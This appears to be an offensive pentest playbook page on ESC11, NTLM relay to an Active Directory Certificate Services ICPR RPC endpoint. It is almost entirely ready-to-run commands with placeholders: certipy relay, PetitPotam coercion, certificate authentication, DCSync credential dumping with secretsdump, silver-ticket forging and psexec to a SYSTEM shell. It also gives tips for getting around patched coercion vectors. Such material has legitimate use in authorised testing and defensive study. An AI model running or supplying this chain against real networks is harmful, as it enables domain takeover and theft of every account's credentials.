# ESC11—NTLM Relay to AD CS ICPR Endpoints

## Theory

> [!Overview] Title
> ESC11 mirrors ESC8 but targets the **MS-ICPR RPC** enrollment interface instead of HTTP web enrollment. The ICPR interface can (optionally) enforce an NTLM integrity check via the `IF_ENFORCEENCRYPTICERTREQUEST` flag. If this enforcement is **disabled** (often for legacy interoperability), an attacker can **relay coerced NTLM** to the CA’s ICPR endpoint and request a certificate for a **machine or user** whose auth was relayed. With a machine (or DC) certificate, the attacker can authenticate as that principal (e.g., perform **DCSync** or forge **silver tickets**).

## Requirements

* **ICPR encryption enforcement disabled** on the CA:

  * In practice, `Enforce Encryption for Requests: Disabled` and `Request Disposition: Issue` (as shown by `certipy find`).
* A **published template** that allows **computer enrollment** with **Client Authentication** (e.g., `Machine`/`Computer`, or `DomainController` for DCs).
* Ability to **coerce NTLM** from a target (e.g., **PetitPotam**, **PrinterBug**, **Coercer**).
* Network access to the CA’s **RPC/DCOM** (e.g., 135 + dynamic RPC).
* Tooling: `certipy`, coercion tool of choice, `impacket` (`secretsdump.py`, `ticketer.py`, `psexec.py`).

### Placeholders

`<DOMAIN>` `<FOREST_DN>` `<DC_HOSTNAME>` `<DC_FQDN>` `<DC_IP>` `<ADCS_HOSTNAME>` `<ADCS_HOST_FQDN>` `<ADCS_IP>` `<CA_NAME>` `<RELAY_TEMPLATE>` `<USER>` `<PASS>` `<LISTEN_IP>` `<PFX_FILE>` `<CCACHE_FILE>` `<NTHASH>` `<DOMAIN_SID>`

---

## Linux

### Enumerate CA and ICPR Settings

```bash
certipy find -u '<USER>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
# Confirm: Web Enrollment (not required for ESC11), Request Disposition: Issue,
# and especially: Enforce Encryption for Requests: Disabled  => vulnerable to ESC11
```

### Step 1 — Start NTLM Relay to ICPR (RPC)

```bash
sudo certipy relay -target "rpc://<ADCS_IP>" -ca "<CA_NAME>" -template <RELAY_TEMPLATE>
# Example <RELAY_TEMPLATE>: DomainController (for DCs) or Machine/Computer (for other hosts)
# Certipy listens on 0.0.0.0:445 and relays to the CA over RPC/ICPR
```

### Step 2 — Coerce Authentication from Target

**PetitPotam (example):**

```bash
python3 PetitPotam.py -u '<USER>' -p '<PASS>' -d '<DOMAIN>' <LISTEN_IP> <DC_IP>
# Triggers the target to authenticate to <LISTEN_IP> (your relay listener)
```

> Alternatives: **Coercer**, **PrinterBug**, etc. If one vector is patched/hardened, try another machine or method.

### Step 3 — Receive and Save the Relayed Certificate

```text
[*] Attacking user '<DC_HOSTNAME>$@<DOMAIN_SHORT>'
[*] Requesting certificate for '<DC_HOSTNAME>$' with template '<RELAY_TEMPLATE>'
[*] Got certificate with DNS Host Name '<DC_FQDN>'
[*] Saved certificate and private key to '<PFX_FILE>'
```

### Step 4 — Authenticate with the Certificate

```bash
certipy auth -pfx '<PFX_FILE>'
# => Writes Kerberos ccache (e.g., '<CCACHE_FILE>') and may print the NT hash for the account
```

---

## Post-Exploitation Paths

### A) DCSync (when cert/hash is for a DC)

Using the **TGT/ccache**:

```bash
KRB5CCNAME=<CCACHE_FILE> secretsdump.py -k -no-pass <DC_FQDN>
# Dumps NTDS.DIT secrets (e.g., <DOMAIN>\\Administrator NT hash)
```

Using the **NT hash** directly:

```bash
secretsdump.py '<DC_HOSTNAME>$'@<DC_FQDN> -hashes :<NTHASH>
```

### B) Silver Ticket (for non-DC machine certs)

1. Retrieve **Domain SID**:

```bash
lookupsid.py '<MACHINE_ACCOUNT>$'@<DC_IP> -hashes :<NTHASH>
# Domain SID: <DOMAIN_SID>
```

2. Forge ticket for a service (e.g., CIFS):

```bash
ticketer.py -nthash <NTHASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<DC_FQDN> Administrator
# Saves Administrator.ccache
```

3. Pass-the-Ticket:

```bash
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass <DC_FQDN>
# Expect a SYSTEM shell on <DC_HOSTNAME>
```

---

## Notes & Troubleshooting

* `ntlmrelayx.py` may lack ICPR support; prefer **certipy** for ESC11 relays.
* If coercion output shows `EfsRpcOpenFileRaw is patched`, try other EFSRPC functions or different vectors (e.g., **Coercer**).
* Ensure CA name is correct (`-ca "<CA_NAME>"`); certipy usually prints it during `find`.
* If relay **times out**, confirm 445 reachability from victim to your listener, and that RPC/135 is reachable from your relay to the CA.
* Kerberos requires proper name resolution; configure `/etc/hosts` or DNS for `<DC_FQDN>`/`<ADCS_HOST_FQDN>` as needed.
